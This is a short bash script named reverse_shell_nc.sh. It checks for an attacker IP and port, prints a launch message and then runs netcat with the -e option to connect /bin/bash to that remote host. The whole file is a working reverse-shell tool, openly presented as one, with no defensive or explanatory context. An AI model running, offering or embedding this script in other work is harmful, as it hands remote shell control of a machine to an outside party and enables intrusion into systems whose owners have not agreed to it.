#!/bin/bash
# reverse_shell_nc.sh - Reverse shell using netcat.
if [ -z "$1" ] || [ -z "$2" ]; then
  echo "Usage: $0 <attacker_ip> <attacker_port>"
  exit 1
fi
echo "Launching Netcat reverse shell to $1:$2..."
nc -e /bin/bash $1 $2
